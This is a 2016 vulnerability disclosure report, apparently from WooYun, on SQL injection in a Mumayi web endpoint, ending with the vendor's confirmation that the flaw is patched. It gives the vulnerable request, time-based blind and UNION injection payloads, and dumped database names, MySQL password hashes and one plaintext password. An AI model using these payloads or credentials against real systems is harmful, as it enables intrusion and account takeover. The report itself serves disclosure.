wybug_detail:
漏洞详情 披露状态：   									2016-01-27：	细节已通知厂商并且等待厂商处理中									2016-01-27：	厂商已经确认，细节仅向厂商公开									2016-01-28：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： mysql联合查询注入 详细说明：  请求地址：http://union.mumayi.com/index.php?s=/Data/showdataPOST参数：daytype=&start_date=2016-01-27&end_date=2016-01-27&tbl_cond=apkid&cond_val=1未过滤变量名：cond_val
Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: daytype=&start_date=2016-01-27&end_date=2016-01-27&tbl_cond=apkid&cond_val=1') AND (SELECT * FROM (SELECT(SLEEP(5)))CTqg) AND ('bzil'='bzil    Vector: AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: daytype=&start_date=2016-01-27&end_date=2016-01-27&tbl_cond=apkid&cond_val=1') UNION ALL SELECT NULL,NULL,CONCAT(0x7162786b71,0x6e797559624146496e4d,0x71766b6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---
   漏洞证明：  web application technology: Nginxback-end DBMS: MySQL 5.0.12available databases [9]:[*] information_schema[*] kumayipay_kumayi[*] mumayipay_mumayi[*] mysql[*] oauth[*] performance_schema[*] uc[*] uc_mumayi[*] ucenterback-end DBMS: MySQL 5.0.12database management system users password hashes:[*] dev57 [1]:    password hash: *95EFE725E6B747621D7540FF6E14912EC090BD41[*] dev57pay [1]:    password hash: *3D11988C53A8999B73696324F36007C296C6FF6E[*] phpmyadmin [1]:    password hash: *779ABEA12875AA7833C9696751592E74919453AF[*] rep [1]:    password hash: *E53143681748C023449D43ADD525270B695EF656[*] root [2]:    password hash: *8C239A5D1876C04CF3CBF309A5477F1EE227C9AC    password hash: NULL[*] ucenter [1]:    password hash: *95EFE725E6B747621D7540FF6E14912EC090BD41[*] union [1]:    password hash: *95EFE725E6B747621D7540FF6E14912EC090BD41[*] www [1]:    password hash: *95EFE725E6B747621D7540FF6E14912EC090BD41   修复方案：  过滤参数，mysql密码过于简单  rep账号对应的密码是mumayi   版权声明：转载请注明来源 呆呆狗@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2016-01-27 16:33 厂商回复： 技术蚂蚁已经进行处理，感谢提醒 最新状态： 2016-01-28：非常谢谢，反馈的安全问题，我们技术已打上安全补丁。
